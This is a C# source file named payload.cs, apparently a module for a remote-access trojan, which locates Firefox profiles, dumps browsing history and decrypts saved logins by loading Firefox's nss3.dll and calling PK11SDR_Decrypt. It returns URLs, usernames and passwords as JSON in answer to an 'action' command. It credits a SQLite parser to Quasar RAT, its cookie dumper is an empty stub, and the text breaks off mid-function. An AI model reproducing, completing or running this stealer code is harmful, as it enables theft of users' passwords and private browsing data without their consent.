// payload.cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Org.BouncyCastle.Asn1;
using System.Security.Cryptography;
using System.Data;
using System.Net;
using Newtonsoft.Json;

public class payload
{
    public payload() {}

    public class clsHistory
    {
        public string szURL { get; set; }
        public string szTitle { get; set; }
        public string szLastUsed { get; set; }
    }

    public class clsDbPlace
    {
        public long id { get; set; }
        public string url { get; set; }
        public string title { get; set; }
        public long last_visit_date { get; set; }
        public string description { get; set; }
    }

    public class clsCookie
    {
        public string szHost { get; set; }
        public string szName { get; set; }
        public string szValue { get; set; }
        public string szCreation { get; set; }
        public string szExpiry { get; set; }
        public string szLastAccessed { get; set; }
        public string szUpdated { get; set; }
    }

    public class clsCredential
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public string Create_Date { get; set; }
        public string Last_Used_Date { get; set; }
        public string Pass_Time_Chage { get; set; }
        public string Pass_Times_Used { get; set; }
    }

    private class FFLogins
    {
        public long NextId { get; set; }
        public Login[] Logins { get; set; }
        public object[] PotentiallyVulnerablePasswords { get; set; }
        public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
        public long Version { get; set; }
    }

    private class Login
    {
        public long Id { get; set; }
        public Uri Hostname { get; set; }
        public object HttpRealm { get; set; }
        public Uri FormSubmitUrl { get; set; }
        public string UsernameField { get; set; }
        public string PasswordField { get; set; }
        public string EncryptedUsername { get; set; }
        public string EncryptedPassword { get; set; }
        public string Guid { get; set; }
        public long EncType { get; set; }
        public long TimeCreated { get; set; }
        public long TimeLastUsed { get; set; }
        public long TimePasswordChanged { get; set; }
        public long TimesUsed { get; set; }
    }

    private class DismissedBreachAlertsByLoginGuid
    {
        
    }

    public string Execute(object param)
    {
        try
        {
            if (!(param is Dictionary<string, object> mapParam))
            {
                return "[-] ERROR: Invalid parameter type. Expected Dictionary.";
            }
            
            if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
            {
                return "[-] Missing parameter json";
            }

            string szJson = jsonValue.ToString();

            string szAction = fnGetJsonValue(szJson, "action");
            string szProfile = fnGetJsonValue(szJson, "profile");

            var responseObj = new Dictionary<string, object>();
            responseObj["status"] = "success";
            responseObj["action"] = szAction;

            if (szAction == "history")
            {
                var result = fnDumpHistory();
                responseObj["data"] = result.Cast<object>().ToList();
            }
            else if (szAction == "credential")
            {
                var result = fnDumpCredential();
                responseObj["data"] = result.Cast<object>().ToList();
            }
            else if (szAction == "cookie")
            {
                var result = fnDumpCookie();
                responseObj["data"] = result.Cast<object>().ToList();
            }
            else
            {
                return "[-] Unknown action: " + szAction;
            }

            return SerializeToJson(responseObj);
        }
        catch (Exception ex)
        {
            return "[-] " + ex.Message;
        }
    }

    private string SerializeToJson(object obj)
    {
        if (obj is Dictionary<string, object> dict)
        {
            var sb = new StringBuilder();
            sb.Append("{");
            bool first = true;
            foreach (var kvp in dict)
            {
                if (!first) sb.Append(",");
                sb.Append($"\"{kvp.Key}\":{SerializeToJson(kvp.Value)}");
                first = false;
            }
            sb.Append("}");
            return sb.ToString();
        }
        else if (obj is List<object> list)
        {
            var sb = new StringBuilder();
            sb.Append("[");
            bool first = true;
            foreach (var item in list)
            {
                if (!first) sb.Append(",");
                sb.Append(SerializeToJson(item));
                first = false;
            }
            sb.Append("]");
            return sb.ToString();
        }
        else if (obj is string str)
        {
            string escaped = str.Replace("\\", "\\\\").Replace("\"", "\\\"");
            return $"\"{escaped}\"";
        }
        else if (obj == null)
        {
            return "null";
        }
        else if (obj is bool b)
        {
            return b ? "true" : "false";
        }
        else if (obj is int || obj is long || obj is double || obj is float || obj is decimal)
        {
            return obj.ToString();
        }
        else
        {
            string escaped = obj.ToString().Replace("\\", "\\\\").Replace("\"", "\\\"");
            return $"\"{escaped}\"";
        }
    }

    private DateTime? fnChromeTimeToDateTime(long webkitTime)
    {
        if (webkitTime <= 0)
            return null;

        try
        {
            DateTime epoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);

            return epoch.AddTicks(webkitTime * 10);
        }
        catch
        {
            return null;
        }
    }

    private string fnGetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success) return match.Groups[1].Value;

        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success) return match.Groups[1].Value.Trim().Replace("\"", "");

        return "";
    }

    private string fnNewTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());

    private string fnszChromeDateTime(long webkitTime)
    {
        DateTime? dt = fnChromeTimeToDateTime(webkitTime);
        return dt == null ? "N/A" : dt?.ToString("F");
    }

    private List<clsHistory> fnDumpHistory()
    {
        List<clsHistory> lsResult = new List<clsHistory>();
        List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();

        foreach (string szDir in lsDir)
        {
            string szFilePath = Path.Combine(szDir, "places.sqlite");
            if (!File.Exists(szFilePath))
                continue;

            string szTempPath = fnNewTempFilePath();
            File.Copy(szFilePath, szTempPath);

            var handler = new clsSQLiteHandler(szTempPath);
            if (!handler.ReadTable("moz_places"))
                continue;

            int nRowCount = handler.GetRowCount();
            for (int i = 0; i < nRowCount; i++)
            {
                var url = handler.GetValue(i, "url");
                var title = handler.GetValue(i, "title");
                var date = handler.GetValue(i, "last_visit_date");

                try
                {
                    lsResult.Add(new clsHistory
                    {
                        szURL = url,
                        szTitle = title,
                        szLastUsed = fnszChromeDateTime(long.Parse(date))?.ToString(),
                    });
                }
                catch
                {
                    // do nothing
                }
            }
        }

        return lsResult;
    }

    private List<clsCookie> fnDumpCookie()
    {
        List<clsCookie> lsResult = new List<clsCookie>();
        List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
        if (lsDir.Count == 0)
            return lsResult;

        

        return lsResult;
    }

    private List<clsCredential> fnDumpCredential()
    {
        List<clsCredential> lsResult = new List<clsCredential>();

        try
        {
            List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
            foreach (string szDir in lsDir)
            {
                string szDbFilePath = Path.Combine(szDir, "logins.db");
                string szJsonFilePath = Path.Combine(szDir, "logins.json");

                if (string.IsNullOrEmpty(szDir) || !File.Exists(szDbFilePath) || !File.Exists(szJsonFilePath))
                    continue;

                using (var decryptor = new FFDecryptor())
                {
                    var r = decryptor.Init(szDir);
                    if (r != 0)
                        throw new Exception("NSS_Init: " + r.ToString("X"));

                    FFLogins logins = JsonConvert.DeserializeObject<FFLogins>(File.ReadAllText(szJsonFilePath));
                    foreach (Login login in logins.Logins)
                    {
                        try
                        {
                            string szUsername = "N/A";
                            string szPassword = "N/A";

                            try 
                            { 
                                szUsername = decryptor.Decrypt(login.EncryptedUsername); 
                            } 
                            catch
                            {
                                // do nothing!
                            }

                            try 
                            { 
                                szPassword = decryptor.Decrypt(login.EncryptedPassword);
                            } 
                            catch
                            {
                                // do nothing!
                            }

                            lsResult.Add(new clsCredential
                            {
                                Url = login.Hostname.ToString(),
                                Username = szUsername,
                                Password = szPassword,
                                Create_Date = fnChromeTimeToDateTime(login.TimeCreated)?.ToString("F"),
                                Last_Used_Date = fnChromeTimeToDateTime(login.TimeLastUsed)?.ToString("F"),
                            });
                        }
                        catch
                        {
                            // do nothing!
                        }
                    }
                }
            }
        }
        catch
        {
            // do nothing!
        }

        return lsResult;
    }

    public class FFDecryptor : IDisposable
    {
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssInit NSS_Init;

        private NssShutdown NSS_Shutdown;

        private Pk11sdrDecrypt PK11SDR_Decrypt;

        private IntPtr NSS3 = IntPtr.Zero;
        private IntPtr Mozglue = IntPtr.Zero;

        public long Init(string configDirectory)
        {
            string szProgramFile = Environment.GetEnvironmentVariable("ProgramW6432") ?? Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string mozillaPath = Path.Combine(szProgramFile, @"Mozilla Firefox\");
            if (!Directory.Exists(mozillaPath))
            {
                mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
            }

            if (!Directory.Exists(mozillaPath))
                throw new Exception("Directory not found: " + mozillaPath);
                
            Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
            if (IntPtr.Zero == Mozglue)
                throw new Exception("Load mozglue.dll failed.");

            NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
            if (IntPtr.Zero == NSS3)
                throw new Exception("Load nss3.dll failed.");

            IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
            if (IntPtr.Zero == initProc)
                throw new Exception("Load NSS_Init failed.");

            IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
            if (IntPtr.Zero == shutdownProc)
                throw new Exception("Load NSS_Shutdown failed.");
            
            IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
            if (IntPtr.Zero == decryptProc)
                throw new Exception("PK11SDR_Decrypt");

            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
            
            return NSS_Init(configDirectory);
        }

        public string Decrypt(string cypherText)
        {
            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
            StringBuilder sb = new StringBuilder(cypherText);

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                }
            }

            return null;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                NSS_Shutdown();
                NativeMethods.FreeLibrary(NSS3);
                NativeMethods.FreeLibrary(Mozglue);
            }
        }
    }

    public static class NativeMethods
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
            [MarshalAs(UnmanagedType.U4)] public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool QueryFullProcessImageName([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In, Out] ref uint lpdwSize);

        /// <summary>
        ///    Performs a bit-block transfer of the color data corresponding to a
        ///    rectangle of pixels from the specified source device context into
        ///    a destination device context.
        /// </summary>
        /// <param name="hdc">Handle to the destination device context.</param>
        /// <param name="nXDest">The leftmost x-coordinate of the destination rectangle (in pixels).</param>
        /// <param name="nYDest">The topmost y-coordinate of the destination rectangle (in pixels).</param>
        /// <param name="nWidth">The width of the source and destination rectangles (in pixels).</param>
        /// <param name="nHeight">The height of the source and the destination rectangles (in pixels).</param>
        /// <param name="hdcSrc">Handle to the source device context.</param>
        /// <param name="nXSrc">The leftmost x-coordinate of the source rectangle (in pixels).</param>
        /// <param name="nYSrc">The topmost y-coordinate of the source rectangle (in pixels).</param>
        /// <param name="dwRop">A raster-operation code.</param>
        /// <returns>
        ///    <c>true</c> if the operation succeedes, <c>false</c> otherwise. To get extended error information, call <see cref="System.Runtime.InteropServices.Marshal.GetLastWin32Error"/>.
        /// </returns>
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
            [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

        [DllImport("gdi32.dll")]
        internal static extern bool DeleteDC([In] IntPtr hdc);

        [DllImport("user32.dll")]
        internal static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("user32.dll")]
        internal static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll", SetLastError = false)]
        internal static extern IntPtr GetMessageExtraInfo();

        /// <summary>
        /// Synthesizes keystrokes, mouse motions, and button clicks.
        /// </summary>
        [DllImport("user32.dll")]
        internal static extern uint SendInput(uint nInputs,
            [MarshalAs(UnmanagedType.LPArray), In] INPUT[] pInputs,
            int cbSize);

        [StructLayout(LayoutKind.Sequential)]
        internal struct INPUT
        {
            internal uint type;
            internal InputUnion u;
            internal static int Size => Marshal.SizeOf(typeof(INPUT));
        }

        [StructLayout(LayoutKind.Explicit)]
        internal struct InputUnion
        {
            [FieldOffset(0)]
            internal MOUSEINPUT mi;
            [FieldOffset(0)]
            internal KEYBDINPUT ki;
            [FieldOffset(0)]
            internal HARDWAREINPUT hi;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct MOUSEINPUT
        {
            internal int dx;
            internal int dy;
            internal int mouseData;
            internal uint dwFlags;
            internal uint time;
            internal IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct KEYBDINPUT
        {
            internal ushort wVk;
            internal ushort wScan;
            internal uint dwFlags;
            internal uint time;
            internal IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct HARDWAREINPUT
        {
            public uint uMsg;
            public ushort wParamL;
            public ushort wParamH;
        }

        [DllImport("user32.dll")]
        internal static extern bool SystemParametersInfo(
            uint uAction, uint uParam, ref IntPtr lpvParam,
            uint flags);

        [DllImport("user32.dll")]
        internal static extern int PostMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr OpenDesktop(
            string hDesktop, int flags, bool inherit,
            uint desiredAccess);

        [DllImport("user32.dll")]
        internal static extern bool CloseDesktop(
            IntPtr hDesktop);

        internal delegate bool EnumDesktopWindowsProc(
            IntPtr hDesktop, IntPtr lParam);

        [DllImport("user32.dll")]
        internal static extern bool EnumDesktopWindows(
            IntPtr hDesktop, EnumDesktopWindowsProc callback,
            IntPtr lParam);

        [DllImport("user32.dll")]
        internal static extern bool IsWindowVisible(
            IntPtr hWnd);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("iphlpapi.dll", SetLastError = true)]
        internal static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion,
            TcpTableClass tblClass, uint reserved = 0);

        [DllImport("iphlpapi.dll")]
        internal static extern int SetTcpEntry(IntPtr pTcprow);

        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcprowOwnerPid
        {
            public uint state;
            public uint localAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] localPort;
            public uint remoteAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] remotePort;
            public uint owningPid;
            public IPAddress LocalAddress
            {
                get { return new IPAddress(localAddr); }
            }

            public ushort LocalPort
            {
                get { return BitConverter.ToUInt16(new byte[2] { localPort[1], localPort[0] }, 0); }
            }

            public IPAddress RemoteAddress
            {
                get { return new IPAddress(remoteAddr); }
            }

            public ushort RemotePort
            {
                get { return BitConverter.ToUInt16(new byte[2] { remotePort[1], remotePort[0] }, 0); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcptableOwnerPid
        {
            public uint dwNumEntries;
            private readonly MibTcprowOwnerPid table;
        }

        internal enum TcpTableClass
        {
            TcpTableBasicListener,
            TcpTableBasicConnections,
            TcpTableBasicAll,
            TcpTableOwnerPidListener,
            TcpTableOwnerPidConnections,
            TcpTableOwnerPidAll,
            TcpTableOwnerModuleListener,
            TcpTableOwnerModuleConnections,
            TcpTableOwnerModuleAll
        }
    }

    public class clsSQLiteHandler
    {
        /// <summary>
        /// Acknowledgements: Quasar RAT.
        /// Repositry: https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Utilities/SQLiteHandler.cs
        /// 
        /// I have modified the encoding.
        /// </summary>

        private byte[] db_bytes;
        private ulong encoding;
        private string[] field_names = new string[1];
        private sqlite_master_entry[] master_table_entries;
        private ushort page_size;
        private byte[] SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private table_entry[] table_entries;

        public clsSQLiteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                this.db_bytes = File.ReadAllBytes(baseName);
                if (GetTextEncoding().GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }
                if (this.db_bytes[0x34] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }
                //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                //{
                //    throw new Exception("No supported Schema layer file-format");
                //}
                this.page_size = (ushort)this.ConvertToInteger(0x10, 2);
                this.encoding = this.ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(this.encoding), decimal.Zero) == 0)
                {
                    this.encoding = 1L;
                }
                this.ReadMasterTable(100L);
            }
        }

        private Encoding GetTextEncoding()
        {
            switch (encoding)
            {
                case 1:
                    return Encoding.UTF8;
                case 2:
                    return Encoding.Unicode;          //UTF-16 LE
                case 3:
                    return Encoding.BigEndianUnicode; //UTF-16 BE
                default:
                    return Encoding.UTF8;
            }
        }

        private ulong ConvertToInteger(int startIndex, int Size)
        {
            if ((Size > 8) | (Size == 0))
            {
                return 0L;
            }
            ulong num2 = 0L;
            int num4 = Size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = (num2 << 8) | this.db_bytes[startIndex + i];
            }
            return num2;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if ((num4 == 0) | (num4 > 9))
            {
                return 0L;
            }
            if (num4 == 1)
            {
                buffer[0] = (byte)(this.db_bytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }
            if (num4 == 9)
            {
                flag = true;
            }
            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = this.db_bytes[endIndex - 1];
                endIndex--;
                index = 1;
            }
            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if ((i - 1) >= startIndex)
                {
                    buffer[index] = (byte)((((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2)) | ((byte)(this.db_bytes[i - 1] << (num3 & 7))));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte)(((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2));
                }
            }
            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            return this.table_entries.Length;
        }

        public string[] GetTableNames()
        {
            List<string> tableNames = new List<string>();
            int num3 = this.master_table_entries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (this.master_table_entries[i].item_type == "table")
                {
                    tableNames.Add(this.master_table_entries[i].item_name);
                }
            }
            return tableNames.ToArray();
        }

        public string GetValue(int row_num, int field)
        {
            if (row_num >= this.table_entries.Length)
            {
                return null;
            }
            if (field >= this.table_entries[row_num].content.Length)
            {
                return null;
            }
            return this.table_entries[row_num].content[field];
        }

        public string GetValue(int row_num, string field)
        {
            int num = -1;
            int length = this.field_names.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (this.field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return null;
            }
            return this.GetValue(row_num, num);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > this.db_bytes.Length)
            {
                return 0;
            }
            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > (this.db_bytes.Length - 1))
                {
                    return 0;
                }
                if ((this.db_bytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }
            return (startIndex + 8);
        }

        private bool IsOdd(long value)
        {
            return ((value & 1L) == 1L);
        }

        private void ReadMasterTable(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this.master_table_entries != null)
                {
                    length = this.master_table_entries.Length;
                    Array.Resize(ref master_table_entries, this.master_table_entries.Length + num2 + 1);
                }
                else
                {
                    this.master_table_entries = new sqlite_master_entry[num2 + 1];
                }
                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }
                    int endIndex = this.GVL((int)num);
                    long num7 = this.CVL((int)num, endIndex);
                    int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this.master_table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num6);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                    endIndex = this.GVL((int)num);
                    num6 = endIndex;
                    long num5 = this.CVL((int)num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = this.GVL(endIndex);
                        numArray[index] = this.CVL(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (this.IsOdd(numArray[index]))
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 13L)) / 2.0));
                            }
                            else
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            numArray[index] = this.SQLDataTypeSize[(int)numArray[index]];
                        }
                        index++;
                    }
                    while (index <= 4);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].item_type = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].item_type = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].item_type = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].item_name = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].item_name = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].item_name = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    this.master_table_entries[length + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2]))), (int)numArray[3]);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) == 0)
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(startIndex, 4)), decimal.One), new decimal(this.page_size))));
                    }
                    else
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One), new decimal(this.page_size))));
                    }
                }
                this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
        }

        public bool ReadTable(string TableName)
        {
            int index = -1;
            int length = this.master_table_entries.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (this.master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    index = i;
                    break;
                }
            }
            if (index == -1)
            {
                return false;
            }
            string[] strArray = this.master_table_entries[index].sql_statement.Substring(this.master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(new char[] { ',' });
            int num6 = strArray.Length - 1;
            for (int j = 0; j <= num6; j++)
            {
                strArray[j] = (strArray[j]).TrimStart();
                int num4 = strArray[j].IndexOf(" ");
                if (num4 > 0)
                {
                    strArray[j] = strArray[j].Substring(0, num4);
                }
                if (strArray[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }

